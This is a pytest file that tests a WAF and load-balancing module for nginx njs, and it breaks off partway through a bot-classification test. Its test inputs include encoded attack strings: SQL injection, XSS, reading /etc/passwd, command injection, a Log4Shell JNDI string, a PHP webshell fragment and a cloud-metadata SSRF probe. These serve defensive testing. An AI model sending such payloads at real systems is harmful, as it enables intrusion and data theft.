"""Unit tests for njs/pcdn.js logic, executed with node (same ECMAScript subset) and mocked r / ngx.

The real njs runtime is covered by test_nginx_e2e.py; this file checks the pure logic
(CIDR/IPv6 parsing, WAF false positives, pool selection) quickly and exhaustively.
"""

import json
import re
import pathlib
import shutil
import subprocess

import pytest

HERE = pathlib.Path(__file__).resolve().parent
pytestmark = pytest.mark.skipif(shutil.which("node") is None, reason="node not installed")

ALL_GROUPS = ["sqli", "xss", "lfi", "rce", "php", "scanner", "protocol"]

HARNESS = r"""
import m from './pcdn.mjs';
import { T } from './pcdn.mjs';
const store = {};
const dict = { get: k => store[k], set: (k, v) => { store[k] = v; }, incr: (k, d, i) => (store[k] = (store[k] === undefined ? i : store[k]) + d),
  delete: k => { delete store[k]; } };
globalThis.ngx = { shared: { pcdn_cnt: dict, pcdn_blk: dict, pcdn_hc: dict, pcdn_fair: dict } };
function req(site, uri, args, extra) {
  extra = extra || {};
  const vars = Object.assign({ pcdn_site: site, remote_addr: '127.0.0.1', request_uri: uri + (args ? '?' + args : ''),
    args: args, host: 'x.test', pcdn_country: 'IR', ssl_protocol: '' }, extra.vars || {});
  const hin = Object.assign({ 'User-Agent': 'Mozilla/5.0' }, extra.headers || {});
  Object.keys(hin).forEach(k => { if (hin[k] === null) delete hin[k]; });
  return { uri: uri, method: extra.method || 'GET', variables: vars, headersIn: hin, headersOut: {},
    args: {}, error: () => {}, log: () => {} };
}
const cases = JSON.parse(process.argv[2]);
const out = cases.map(c => {
  if (c.kind === 'cidr') return T.inCidr(T.parseIP(c.ip), T.cidr(c.net));
  if (c.kind === 'ip') return T.parseIP(c.ip);
  if (c.kind === 'verdict') return m.verdict(req(c.site, c.uri, c.args || '', c.extra));
  if (c.kind === 'upstream') {
    const seen = {};
    for (let i = 0; i < c.n; i++) { const h = m.upstream(req(c.site, '/', '', { vars: { pcdn_pool: c.pool, remote_addr: c.ip || ('10.0.0.' + (i % 250)) } })); seen[h] = (seen[h] || 0) + 1; }
    return seen;
  }
  if (c.kind === 'tnpick') {
    const seen = {};
    for (let i = 0; i < c.uris.length; i++) {
      seen[c.uris[i]] = m.tunnelUpstream({ uri: c.uris[i], method: 'GET', variables: {
        pcdn_site: c.site, pcdn_tn: c.tn, pcdn_tn_pool: c.pool, pcdn_tn_prefix: c.prefix,
        remote_addr: c.ip || '10.0.0.1' }, headersIn: {}, args: {}, error: () => {} });
    }
    return seen;
  }
  if (c.kind === 'hc') { store[c.key] = c.value; return null; }
  if (c.kind === 'fairset') {
    const res = {};
    m.fairSet({ args: { hot: c.hot }, return: code => { res.code = code; } });
    res.hot = store.hot === undefined ? null : store.hot;
    return res;
  }
  if (c.kind === 'fair') {   // c.opens: [[site, tn, method], ...] -> the $pcdn_tn_fair value of each
    return c.opens.map(o => m.tunnelFair({ method: o[2] || 'GET', variables: { pcdn_site: o[0], pcdn_tn: o[1] || 'ws' } }));
  }
  if (c.kind === 'speed') {
    const res = {};
    const r = req(c.site, '/__pcdn/speed/down', '', {});
    r.args = c.args;
    r.return = (code, body) => { res.code = code; res.len = body === undefined ? null : body.length; };
    r.internalRedirect = u => { res.redirect = u; };
    m.speedDown(r);
    return res;
  }
  if (c.kind === 'bodyneed') return m.bodyNeed(req(c.site, c.uri, c.args || '', c.extra));
  if (c.kind === 'inspect') {
    const r = req(c.site, '/__pcdn/body' + c.uri, '', c.extra), res = {};
    r.requestText = c.body;
    r.return = (code, body) => { res.code = code; res.body = String(body).slice(0, 0); };
    r.internalRedirect = u => { res.redirect = u; };
    m.bodyInspect(r);
    res.v = r.variables.pcdn_verdict || null;
    return res;
  }
  if (c.kind === 'tfh') {
    const r = req(c.site, c.uri, '', c.extra);
    r.headersOut = Object.assign({}, c.out);
    m.tfHeaders(r);
    return r.headersOut;
  }
  if (c.kind === 'botclass') return T.botClass(c.ua, c.vbot, c.blockEmpty !== false);
  if (c.kind === 'prep') {
    const P = T.prepSite('x', c.site);
    return { rules: P.waf.rules.map(r => r.id), fn: P.waf.fn.map(r => r.id), body: P.waf.body };
  }
  if (c.kind === 'catalog') return {
    rules: T.WAF_RULES.filter(r => r.k).map(r => [r.id, r.k, r.pl, r.t, r.re.source]),
    fn: T.WAF_PACK_FN.map(r => [r.id, r.k, r.pl]), body: T.WAF_BODY_XMLRPC.map(r => [r.id, r.pl, r.re.source]),
    versions: T.WAF_PACK_VERSION };
  if (c.kind === 'timed') {   // worst verdict time over [prefix, unit, count, suffix] values put in c.field
    let worst = 0, v = null;
    c.inputs.forEach(x => {
      const s = x[0] + x[1].repeat(x[2]) + x[3];
      const extra = c.field === 'path' ? {} : { headers: { [c.field]: s } };
      const r = req(c.site, c.field === 'path' ? s : '/', '', extra);
      const t0 = process.hrtime.bigint(); v = m.verdict(r); const ms = Number(process.hrtime.bigint() - t0) / 1e6;
      if (ms > worst) worst = ms;
    });
    return { worst: worst, v: v };
  }
  if (c.kind === 'redos') {
    // worst case time of every pack / bot / body regex over adversarial inputs (backtracking engine)
    const res = T.WAF_RULES.filter(r => r.k).map(r => r.re).concat(T.WAF_BODY_XMLRPC.map(r => r.re),
      [T.BOT_GOOGLE, T.BOT_BING, T.BOT_HEADLESS, T.BOT_LIBRARY, T.JSON_CT, T.CT_SYNTAX, T.CT_EXPECTED, T.MONGO_OPS]);
    let worst = 0, which = '';
    const inputs = c.inputs.map(x => x[0] + x[1].repeat(x[2]) + x[3]);
    res.forEach(re => inputs.forEach(s => {
      const t0 = process.hrtime.bigint(); re.test(s); const ms = Number(process.hrtime.bigint() - t0) / 1e6;
      if (ms > worst) { worst = ms; which = re.source + ' / ' + s.slice(0, 20); }
    }));
    return { worst: worst, which: which };
  }
});
console.log(JSON.stringify(out));
"""


def build(tmp_path, sites):
    src = (HERE.parent / "njs/pcdn.js").read_text()
    src = src.replace("from 'sites.js'", "from './sites.mjs'")
    src += ("\nexport const T = { parseIP, cidr, inCidr, fnv, prepSite, botClass, WAF_RULES, WAF_PACK_FN, WAF_BODY_XMLRPC,"
            " WAF_PACK_VERSION, BOT_GOOGLE, BOT_BING, BOT_HEADLESS, BOT_LIBRARY, JSON_CT, CT_SYNTAX, CT_EXPECTED,"
            " MONGO_OPS };\n")
    (tmp_path / "pcdn.mjs").write_text(src)
    (tmp_path / "sites.mjs").write_text("export default " + json.dumps(sites) + ";\n")
    (tmp_path / "h.mjs").write_text(HARNESS)


def run(tmp_path, cases):
    p = subprocess.run(["node", str(tmp_path / "h.mjs"), json.dumps(cases)], capture_output=True, text=True, cwd=tmp_path)
    assert p.returncode == 0, p.stderr
    return json.loads(p.stdout)


def site(**kw):
    s = {"domain": "x.test", "secret": "k", "hosts": ["x.test"], "blocked_ips": [], "min_tls": "1.2",
         "firewall": {"default_action": "allow", "rules": []}, "hotlink": {"enabled": False}, "ratelimit": [],
         "ddos": {"mode": "off"}, "waf": {"mode": "off", "groups": [], "exclusions": [], "off_paths": []},
         "pools": {}, "image": {"enabled": False}}
    s.update(kw)
    return s


def test_cidr_and_ipv6(tmp_path):
    build(tmp_path, {})
    cases = [("10.1.2.3", "10.0.0.0/8", True), ("11.1.2.3", "10.0.0.0/8", False), ("1.2.3.4", "0.0.0.0/0", True),
             ("1.2.3.4", "1.2.3.4", True), ("1.2.3.5", "1.2.3.4/32", False), ("192.168.1.255", "192.168.1.0/24", True),
             ("2001:db8::1", "2001:db8::/32", True), ("2001:db9::1", "2001:db8::/32", False),
             ("::1", "::1/128", True), ("2001:db8:0:0:1::", "2001:db8::/64", True),
             ("2001:db8:0:1::", "2001:db8::/64", False), ("2001:db8::1", "10.0.0.0/8", False),
             ("::ffff:10.0.0.1", "::ffff:10.0.0.0/104", True), ("fe80::1", "fe80::/10", True), ("fec0::1", "fe80::/10", False)]
    res = run(tmp_path, [{"kind": "cidr", "ip": ip, "net": net} for ip, net, _ in cases])
    assert res == [want for *_, want in cases]
    ips = run(tmp_path, [{"kind": "ip", "ip": x} for x in ("::ffff:10.0.0.1", "1:2:3:4:5:6:7:8", "1::2::3", "1.2.3.256", "abc")])
    assert ips[0] == {"v": 6, "a": [0, 0, 0, 0, 0, 0xffff, 0x0a00, 1]}
    assert ips[1]["a"] == [1, 2, 3, 4, 5, 6, 7, 8]
    assert ips[2:] == [None, None, None]


BENIGN = [
    ("/", ""), ("/blog/2024/01/hello-world", "utm_source=news&utm_medium=email"),
    ("/search", "q=O%27Reilly+and+sons"), ("/search", "q=rock+%27n%27+roll"), ("/search", "q=it%27s+fine+or+not"),
    ("/", "email=a%40b.com&redirect=https%3A%2F%2Fexample.com%2Fa%3Fb%3Dc"), ("/p", "q=1%2B1%3D2"),
    ("/products", "sort=price&order=desc&page=2"), ("/wp-content/uploads/2024/05/photo.jpg", ""),
    ("/search", "q=select+a+plan"), ("/cart", "coupon=SAVE-20%25"), ("/api/v1/items", "ids=1,2,3&fields=name,price"),
    ("/search", "q=%D8%B3%D9%84%D8%A7%D9%85+%D8%AF%D9%86%DB%8C%D8%A7"), ("/docs/a.b.c/index.html", ""),
    ("/", "text=Tom%27s+and+Jerry%27s+best+episodes"), ("/", "q=php+tutorial"), ("/", "q=cat+food"),
]
ATTACKS = [
    ("/", "id=1%27+or+%271%27%3D%271", 942100), ("/", "id=1+or+1%3D1", 942110), ("/", "q=1+union+select+user,pass+from+users", 942190),
    ("/", "id=1+and+sleep(5)", 942160), ("/", "q=%3Cscript%3Ealert(1)%3C%2Fscript%3E", 941100),
    ("/", "q=%3Cimg+src%3Dx+onerror%3Dalert(1)%3E", 941110), ("/", "u=javascript%3Aalert(1)", 941120),
    ("/", "f=..%2F..%2Fetc%2Fpasswd", 930100), ("/", "cmd=%3Bcat+%2Fetc%2Fpasswd", 930110),
    ("/", "x=%24%7Bjndi%3Aldap%3A%2F%2Fe.com%2Fa%7D", 932110), ("/", "c=%3C%3Fphp+system(%24_GET%5Bx%5D)", 933100),
    ("/", "f=php%3A%2F%2Ffilter%2Fresource%3Dindex", 933110), ("/.env", "", 913120),
    ("/", "id=1%2527%2520or%2520%25271%2527%253D%25271", 942100),  # double-encoded payloads are decoded again
]


def test_waf_signatures_and_false_positives(tmp_path):
    waf = {"mode": "block", "paranoia": 1, "groups": ALL_GROUPS, "exclusions": [], "off_paths": []}
    build(tmp_path, {"1": site(waf=waf)})
    res = run(tmp_path, [{"kind": "verdict", "site": "1", "uri": u, "args": a} for u, a in BENIGN])
    assert res == ["ok"] * len(BENIGN), list(zip(BENIGN, res))
    res = run(tmp_path, [{"kind": "verdict", "site": "1", "uri": u, "args": a} for u, a, _ in ATTACKS])
    assert res == [f"block:waf:{rid}" for *_, rid in ATTACKS]
    # scanner UA, unknown method, null byte
    res = run(tmp_path, [{"kind": "verdict", "site": "1", "uri": "/", "extra": {"headers": {"User-Agent": "Nikto/2.5"}}},
                         {"kind": "verdict", "site": "1", "uri": "/", "extra": {"method": "TRACK"}},
                         {"kind": "verdict", "site": "1", "uri": "/a", "args": "x=%00"}])
    assert res == ["block:waf:913100", "block:waf:920100", "block:waf:920270"]


def test_waf_paranoia_and_groups(tmp_path):
    base = {"mode": "detect", "exclusions": [], "off_paths": []}
    build(tmp_path, {"1": site(waf=dict(base, paranoia=1, groups=["xss"])),
                     "2": site(waf=dict(base, paranoia=2, groups=["sqli"])),
                     "3": site(waf=dict(base, paranoia=1, groups=["sqli"]))})
    q = "q=select+name+from+users"
    res = run(tmp_path, [{"kind": "verdict", "site": "1", "uri": "/", "args": "id=1+or+1%3D1"},
                         {"kind": "verdict", "site": "2", "uri": "/", "args": q},
                         {"kind": "verdict", "site": "3", "uri": "/", "args": q}])
    assert res == ["ok", "log:waf:942400", "ok"]


def test_firewall_country_unknown_matches_nothing(tmp_path):
    rules = [{"id": "notir", "action": "block", "conditions": [{"field": "country", "op": "not_in", "value": ["IR"]}]}]
    build(tmp_path, {"1": site(firewall={"default_action": "allow", "rules": rules})})
    res = run(tmp_path, [{"kind": "verdict", "site": "1", "uri": "/", "extra": {"vars": {"pcdn_country": cc}}}
                         for cc in ("IR", "DE", "")])
    assert res == ["ok", "block:firewall:notir", "ok"]


def test_pool_selection(tmp_path):
    pool = {"method": "weighted", "protocol": "http", "health": {"enabled": True, "path": "/", "interval": 5, "timeout": 2, "expect": "2xx"},
            "origins": [{"hp": "10.0.0.1:80", "weight": 3, "backup": False}, {"hp": "10.0.0.2:80", "weight": 1, "backup": False},
                        {"hp": "10.0.0.9:80", "weight": 1, "backup": True}]}
    sticky = dict(pool, method="ip_hash")
    build(tmp_path, {"1": site(pools={"main": pool, "sticky": sticky})})
    res = run(tmp_path, [{"kind": "upstream", "site": "1", "pool": "main", "n": 4000}])[0]
    assert set(res) == {"10.0.0.1:80", "10.0.0.2:80"} and 2.4 < res["10.0.0.1:80"] / res["10.0.0.2:80"] < 3.8
    res = run(tmp_path, [{"kind": "upstream", "site": "1", "pool": "sticky", "n": 50, "ip": "203.0.113.7"}])[0]
    assert len(res) == 1  # same client, same origin
    down = [{"kind": "hc", "key": "1|main|10.0.0.1:80", "value": 2}, {"kind": "hc", "key": "1|main|10.0.0.2:80", "value": 5}]
    res = run(tmp_path, down + [{"kind": "upstream", "site": "1", "pool": "main", "n": 50}])[-1]
    assert res == {"10.0.0.9:80": 50}  # backup only when every primary is down
    res = run(tmp_path, down + [{"kind": "hc", "key": "1|main|10.0.0.9:80", "value": 3},
                                {"kind": "upstream", "site": "1", "pool": "main", "n": 400}])[-1]
    assert set(res) == {"10.0.0.1:80", "10.0.0.2:80"}  # everything down: fail open to the primaries
    assert run(tmp_path, [{"kind": "upstream", "site": "1", "pool": "nope", "n": 1}])[0] == {"127.0.0.1:9": 1}


def _pool3(**over):
    p = {"method": "weighted", "protocol": "http",
         "health": {"enabled": True, "path": "/", "interval": 5, "timeout": 2, "expect": "2xx"},
         "origins": [{"hp": "10.0.0.1:80", "weight": 1, "backup": False, "up": None},
                     {"hp": "10.0.0.2:80", "weight": 1, "backup": False, "up": None},
                     {"hp": "10.0.0.3:80", "weight": 1, "backup": False, "up": None}]}
    p.update(over)
    return p


def test_tunnel_rendezvous_affinity(tmp_path):
    # F1: xhttp/h2 tunnel sessions must stick to ONE origin. The session id is the path segment
    # after the tunnel prefix; every request of a session (the packet-up GET and its POSTs) hashes
    # to the same origin, and a health change only moves the sessions on the origin that failed.
    build(tmp_path, {"1": site(pools={"main": _pool3()})})
    ids = [f"sess{i:03d}" for i in range(40)]
    uris = []
    for sid in ids:
        uris += [f"/p/{sid}", f"/p/{sid}/1", f"/p/{sid}/50"]
    res = run(tmp_path, [{"kind": "tnpick", "site": "1", "pool": "main", "tn": "xhttp", "prefix": "/p", "uris": uris}])[0]
    for sid in ids:  # a GET + its packet-up POSTs all reach one origin
        assert len({res[f"/p/{sid}"], res[f"/p/{sid}/1"], res[f"/p/{sid}/50"]}) == 1, sid
    assert len({res[f"/p/{sid}"] for sid in ids}) == 3  # sessions spread across all three origins
    before = {sid: res[f"/p/{sid}"] for sid in ids}
    dead = "10.0.0.1:80"
    res2 = run(tmp_path, [{"kind": "hc", "key": "1|main|" + dead, "value": 5},
                          {"kind": "tnpick", "site": "1", "pool": "main", "tn": "xhttp", "prefix": "/p",
                           "uris": [f"/p/{sid}" for sid in ids]}])[-1]
    for sid in ids:
        if before[sid] == dead:
            assert res2[f"/p/{sid}"] != dead              # moved off the failed origin
        else:
            assert res2[f"/p/{sid}"] == before[sid]       # every other session is undisturbed


def test_tunnel_ws_grpc_keep_random_and_web_balancer_unpinned(tmp_path):
    # F1 guard: only xhttp/h2 use the session-key rendezvous. ws/grpc tunnel pools and the web
    # balancer (upstream(), no key) must still spread across the whole pool, not pin to one origin.
    build(tmp_path, {"1": site(pools={"main": _pool3(health={"enabled": False})})})
    web = run(tmp_path, [{"kind": "upstream", "site": "1", "pool": "main", "n": 600}])[0]
    assert len(web) == 3                                   # weighted-random over all three origins
    ws = run(tmp_path, [{"kind": "tnpick", "site": "1", "pool": "main", "tn": "ws", "prefix": "/p",
                         "uris": [f"/p/s{i}" for i in range(400)]}])[0]
    assert len(set(ws.values())) == 3                      # ws pool uses random, not a session hash


def test_tunnel_paths_only_see_firewall_block_allow_log(tmp_path):
    waf = {"mode": "block", "paranoia": 1, "groups": ALL_GROUPS, "exclusions": [], "off_paths": []}
    rules = [{"id": "chal", "action": "challenge", "conditions": [{"field": "path", "op": "starts_with", "value": "/"}]},
             {"id": "watch", "action": "log", "conditions": [{"field": "header", "name": "X-W", "op": "eq", "value": "1"}]},
             {"id": "bad", "action": "block", "conditions": [{"field": "country", "op": "in", "value": ["RU"]}]}]
    rl = [{"id": "all", "path_re": "^/.*$", "methods": [], "requests": 1, "period": 60, "action": "block", "block_seconds": 60}]
    common = dict(waf=waf, ratelimit=rl, ddos={"mode": "js"}, firewall={"default_action": "allow", "rules": rules},
                  hotlink={"enabled": True, "extensions": ["png"], "allowed_referers": [], "allow_empty": False},
                  tunnel_paths=["/vpn", "/grpc.Svc"])
    build(tmp_path, {"1": site(**common),
                     "2": site(**dict(common, firewall={"default_action": "block", "rules": rules}),
                               blocked_ips=["10.0.0.0/8"])})
    sqli = "id=1%27+or+%271%27%3D%271"
    res = run(tmp_path, [
        {"kind": "verdict", "site": "1", "uri": "/vpn/x.png", "args": sqli, "extra": {"headers": {"User-Agent": "sqlmap"}}},
        {"kind": "verdict", "site": "1", "uri": "/vpn", "args": sqli},
        {"kind": "verdict", "site": "1", "uri": "/grpc.Svc/Tun"},
        {"kind": "verdict", "site": "1", "uri": "/vpn", "extra": {"headers": {"X-W": "1"}}},
        {"kind": "verdict", "site": "1", "uri": "/vpn", "extra": {"vars": {"pcdn_country": "RU"}}},
        {"kind": "verdict", "site": "1", "uri": "/other"},              # normal path: challenged
        {"kind": "verdict", "site": "1", "uri": "/vp"},                 # not a prefix match
        {"kind": "verdict", "site": "2", "uri": "/vpn"},                # default_action block still applies
        {"kind": "verdict", "site": "2", "uri": "/vpn", "extra": {"vars": {"remote_addr": "10.1.2.3"}}},
    ])
    assert res == ["ok", "ok", "ok", "log:firewall:watch", "block:firewall:bad", "challenge:firewall:chal",
                   "challenge:firewall:chal", "block:firewall:default", "block:firewall:blocked_ips"]


# ----------------------------------------------------------------- SPEC §14.2 managed WAF packs

PACK_RANGES = {"generic": 990000, "wordpress": 991000, "joomla": 992000, "drupal": 993000, "laravel": 994000,
               "api": 995000}
# the published, stable rule ids per pack (a removed or renumbered id breaks customers' exclusions)
PACK_IDS = {
    "generic": {990100, 990110, 990120, 990130, 990140, 990150, 990160, 990170, 990180, 990190},
    "wordpress": {991100, 991105, 991110, 991120, 991130, 991140, 991150, 991160, 991165, 991170, 991180},
    "joomla": {992100, 992110, 992120, 992130, 992140, 992150},
    "drupal": {993100, 993110, 993120, 993130, 993135, 993140},
    "laravel": {994100, 994110, 994115, 994120, 994125, 994130, 994140, 994150},
    "api": {995100, 995110, 995120, 995130, 995140, 995150, 995160, 995165, 995170, 995175},
}


def test_waf_pack_catalog_ids_ranges_and_versions(tmp_path):
    build(tmp_path, {})
    cat = run(tmp_path, [{"kind": "catalog"}])[0]
    ids = {}
    for rid, pack, pl, *_ in cat["rules"] + [r + ["", ""] for r in cat["fn"]]:
        ids.setdefault(pack, set()).add(rid)
        assert 1 <= pl <= 3
    for rid, pl, _ in cat["body"]:
        ids["wordpress"].add(rid)
    assert ids == PACK_IDS
    for pack, rids in ids.items():
        assert all(PACK_RANGES[pack] <= r < PACK_RANGES[pack] + 1000 for r in rids), pack
    all_ids = [r[0] for r in cat["rules"]] + [r[0] for r in cat["fn"]] + [r[0] for r in cat["body"]]
    assert len(all_ids) == len(set(all_ids))                       # never two checks under one id
    assert cat["versions"] == {p: 1 for p in PACK_RANGES}
    # linear-time patterns: no quantified group (nested / overlapping repetition)
    for rid, _, _, _, src in cat["rules"]:
        assert not re.search(r"\)[*+{]", src), (rid, src)


def test_waf_packs_enabled_only_when_listed(tmp_path):
    base = {"mode": "block", "paranoia": 3, "groups": ["sqli"], "exclusions": [], "off_paths": []}
    build(tmp_path, {})
    res = run(tmp_path, [{"kind": "prep", "site": site(waf=dict(base))},
                         {"kind": "prep", "site": site(waf=dict(base, packs=["wordpress", "nope"]))},
                         {"kind": "prep", "site": site(waf=dict(base, packs=["api"], paranoia=1))}])
    none, wp, api = res
    assert not [r for r in none["rules"] if r >= 990000] and none["fn"] == [] and none["body"] is None
    assert {r for r in wp["rules"] if r >= 990000} | set(wp["fn"]) == PACK_IDS["wordpress"] - {991100, 991110}
    assert all(r < 990000 or 991000 <= r < 992000 for r in wp["rules"])
    assert wp["body"] == {"xmlrpc": True, "json": False}
    assert set(api["fn"]) == {995110, 995170} and api["body"] == {"xmlrpc": False, "json": True}   # paranoia 1


def test_waf_pack_rules_hit_and_spare_benign(tmp_path):
    waf = {"mode": "block", "paranoia": 1, "groups": [], "exclusions": [{"rule_id": 994100, "path_re": "^/ok/.*$"}],
           "off_paths": [], "packs": list(PACK_RANGES)}
    build(tmp_path, {"1": site(waf=waf)})
    hits = [("/.env", "", 994100), ("/a/.env.local", "", 994100), ("/_ignition/execute-solution", "", 994110),
            ("/_debugbar/open", "", 994120), ("/storage/logs/laravel.log", "", 994130),
            ("/vendor/x/y.php", "", 994150), ("/", "author=2", 991130), ("/wp-config.php~", "", 991120),
            ("/wp-content/uploads/2024/shell.php", "", 991150), ("/wp-content/debug.log", "", 991160),
            ("/wp-content/plugins/x/dl.php", "file=../../wp-config.php", 991140),
            ("/configuration.php.bak", "", 992100), ("/", "option=com_x&view=..%2F..%2Fetc", 992130),
            ("/api/index.php/v1/config/application", "public=true", 992110),
            ("/user/register", "element_parents=account/mail/%23value", 993100),
            ("/", "name%5B%23post_render%5D%5B%5D=passthru", 993100),
            ("/sites/default/settings.php", "", 993120), ("/c99.php", "", 990100), ("/backup.tar.gz", "", 990110),
            ("/.DS_Store", "", 990120), ("/phpinfo.php", "", 990130),
            ("/", "url=http%3A%2F%2F169.254.169.254%2Flatest", 990140), ("/actuator/env", "", 990170),
            ("/a/..;/admin", "", 990180), ("/", "a%5B__proto__%5D%5Bx%5D=1", 995150),
            ("/", "q%5B%24where%5D=1", 995160)]
    benign = [("/ok/.env", ""), ("/environment", ""), ("/", "author_name=x"), ("/wp-content/uploads/a.jpg", ""),
              ("/blog/configuration-guide", ""), ("/", "filters%5Bprice%5D%5B%24gt%5D=5"), ("/", "q=169.254.1.1"),
              ("/vendor/app.js", ""), ("/wp-login.php", ""), ("/api/items", "sort=-price")]
    res = run(tmp_path, [{"kind": "verdict", "site": "1", "uri": u, "args": a} for u, a, _ in hits])
    assert res == [f"block:waf:{rid}" for *_, rid in hits], list(zip(hits, res))
    res = run(tmp_path, [{"kind": "verdict", "site": "1", "uri": u, "args": a} for u, a in benign])
    assert res == ["ok"] * len(benign), list(zip(benign, res))
    # header / size checks
    xml = {"Content-Type": "text/xml"}
    res = run(tmp_path, [
        {"kind": "verdict", "site": "1", "uri": "/xmlrpc.php", "extra": {"method": "POST", "headers": dict(xml, **{"Content-Length": "200000"})}},
        {"kind": "verdict", "site": "1", "uri": "/xmlrpc.php", "extra": {"method": "POST", "headers": dict(xml, **{"Transfer-Encoding": "chunked"})}},
        {"kind": "verdict", "site": "1", "uri": "/xmlrpc.php", "extra": {"method": "POST", "headers": dict(xml, **{"Content-Length": "300"})}},
        {"kind": "verdict", "site": "1", "uri": "/api", "extra": {"method": "POST", "headers": {"Content-Type": "json", "Content-Length": "2"}}},
        {"kind": "verdict", "site": "1", "uri": "/api", "extra": {"method": "POST", "headers": {"Content-Type": "application/json; charset=utf-8", "Content-Length": "2"}}},
        {"kind": "verdict", "site": "1", "uri": "/api", "extra": {"headers": {"X-HTTP-Method-Override": "TRACE"}}},
        {"kind": "verdict", "site": "1", "uri": "/api", "extra": {"headers": {"X-HTTP-Method-Override": "DELETE"}}},
    ])
    assert res == ["block:waf:991105", "block:waf:991105", "ok", "block:waf:995110", "ok", "block:waf:995170", "ok"]


def test_waf_pack_regexes_are_linear(tmp_path):
    build(tmp_path, {})
    n = 50000   # [prefix, repeated unit, count, suffix], expanded in node
    inputs = [["", u, n, ""] for u in ("a", "/", "/a", ".", "%", "[$", "a.", "-", "\\", " ", "a/", "x;", "a=b; ")] + [
        ["<methodname>", " ", n, "x"], ["/wp-content/uploads/", "a/", n, ""], ["/sites/", "a", n, ""],
        ["application/json", "; a=b", n // 8, "\""], ["}__", "a", n, ""], ["name[", "a", n, ""],
        ["/_ignition/", "a", n, ""], ["/storage/logs/", "a", n, ".lo"], ["/vendor/", "a", n, ".ph"],
        ["/wp-content/uploads/", "a", n, ".ph"], ["text/", "a", 60, "/" + "b" * n]]
    res = run(tmp_path, [{"kind": "redos", "inputs": inputs}])[0]
    assert res["worst"] < 50, res


# ----------------------------------------------------------------- request bodies (xmlrpc / JSON)

def test_body_inspection_routing_and_verdicts(tmp_path):
    waf = {"mode": "block", "paranoia": 1, "groups": ["sqli", "xss"], "packs": ["wordpress", "api"],
           "exclusions": [{"rule_id": 995220, "path_re": "^/free/.*$"}, {"rule_id": 995150, "path_re": "^/free/.*$"}],
           "off_paths": ["^/nowaf/.*$"]}
    build(tmp_path, {"1": site(waf=waf), "2": site(waf=dict(waf, mode="detect")),
                     "3": site(waf=dict(waf, packs=["generic"]))})
    j = {"Content-Type": "application/json", "Content-Length": "20"}
    x = {"Content-Type": "text/xml", "Content-Length": "20"}
    need = run(tmp_path, [
        {"kind": "bodyneed", "site": "1", "uri": "/xmlrpc.php", "extra": {"method": "POST", "headers": x}},
        {"kind": "bodyneed", "site": "1", "uri": "/api/x", "extra": {"method": "PUT", "headers": j}},
        {"kind": "bodyneed", "site": "1", "uri": "/api/x", "extra": {"method": "GET", "headers": j}},
        {"kind": "bodyneed", "site": "1", "uri": "/api/x", "extra": {"method": "POST", "headers": dict(j, **{"Content-Length": "999999"})}},
        {"kind": "bodyneed", "site": "1", "uri": "/api/x", "extra": {"method": "POST", "headers": {"Content-Type": "text/plain", "Content-Length": "5"}}},
        {"kind": "bodyneed", "site": "1", "uri": "/nowaf/x", "extra": {"method": "POST", "headers": j}},
        {"kind": "bodyneed", "site": "1", "uri": "/api/x", "extra": {"method": "POST", "headers": j, "vars": {"pcdn_wafskip": "1"}}},
        {"kind": "bodyneed", "site": "3", "uri": "/xmlrpc.php", "extra": {"method": "POST", "headers": x}},
    ])
    assert need == ["1", "1", "", "", "", "", "", ""]
    multicall = "<methodCall><methodName> system.multicall </methodName></methodCall>"
    res = run(tmp_path, [
        {"kind": "inspect", "site": "1", "uri": "/xmlrpc.php", "body": multicall},
        {"kind": "inspect", "site": "1", "uri": "/xmlrpc.php", "body": "<methodCall><methodName>pingback.ping</methodName>"},
        {"kind": "inspect", "site": "1", "uri": "/api", "body": '{"a": "1\' or \'1\'=\'1"}', "extra": {"headers": j}},
        {"kind": "inspect", "site": "1", "uri": "/api", "body": '{"__proto__": {"x": 1}}', "extra": {"headers": j}},
        {"kind": "inspect", "site": "1", "uri": "/free/x", "body": '{"__proto__": {"x": 1}}', "extra": {"headers": j}},
        {"kind": "inspect", "site": "1", "uri": "/api", "body": '{"constructor": {"prototype": {"x": 1}}}', "extra": {"headers": j}},
        {"kind": "inspect", "site": "1", "uri": "/api", "body": '{"f": {"$where": "1"}}', "extra": {"headers": j}},
        {"kind": "inspect", "site": "1", "uri": "/api", "body": '{"f": {"$gt": 1}}', "extra": {"headers": j}},
        {"kind": "inspect", "site": "1", "uri": "/api", "body": "[" * 33 + "]" * 33, "extra": {"headers": j}},
        {"kind": "inspect", "site": "1", "uri": "/api", "body": '["[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[["]', "extra": {"headers": j}},
        {"kind": "inspect", "site": "1", "uri": "/api", "body": "[" + "1," * 10001 + "1]", "extra": {"headers": j}},
        {"kind": "inspect", "site": "1", "uri": "/api", "body": "{broken", "extra": {"headers": j}},
        {"kind": "inspect", "site": "1", "uri": "/api", "body": '{"name": "O\'Reilly", "n": [1, 2]}', "extra": {"headers": j}},
        {"kind": "inspect", "site": "2", "uri": "/xmlrpc.php", "body": multicall},
    ])
    blocked = {"code": 403, "body": ""}
    assert res[0] == dict(blocked, v="block:waf:991100")
    assert res[1] == {"redirect": "@pcdn_body", "v": None}                    # pingback: paranoia 2
    assert res[2] == dict(blocked, v="block:waf:942100")                      # signatures on JSON strings
    assert res[3] == dict(blocked, v="block:waf:995220")
    assert res[4] == {"redirect": "@pcdn_body", "v": None}                    # exclusion by path
    assert res[5] == dict(blocked, v="block:waf:995220")
    assert res[6] == dict(blocked, v="block:waf:995230")
    assert res[7] == {"redirect": "@pcdn_body", "v": None}                    # $gt: paranoia 2
    assert res[8] == dict(blocked, v="block:waf:995210")                      # depth 33 > 32
    assert res[9] == {"redirect": "@pcdn_body", "v": None}                    # brackets inside a string
    assert res[10] == dict(blocked, v="block:waf:995210")                     # > 10000 values
    assert res[11] == {"redirect": "@pcdn_body", "v": None}                   # invalid JSON: paranoia 2
    assert res[12] == {"redirect": "@pcdn_body", "v": None}
    assert res[13] == {"redirect": "@pcdn_body", "v": "log:waf:991100"}      # detect: logged, proxied


# ----------------------------------------------------------------- bot management

def test_bot_classification_matrix(tmp_path):
    build(tmp_path, {})
    gb, bb = "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)", "Mozilla/5.0 (compatible; bingbot/2.0)"
    chrome = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126.0 Safari/537.36"
    cases = [
        (gb, "1gb", True, None), (gb, "0gb", False, "spoofed"), (gb, "2gb", False, "spoofed"),
        (bb, "2gb", True, None), (bb, "1gb", False, "spoofed"),
        (gb, "", False, None), (bb, "", False, None),                 # no ranges at all: fail open
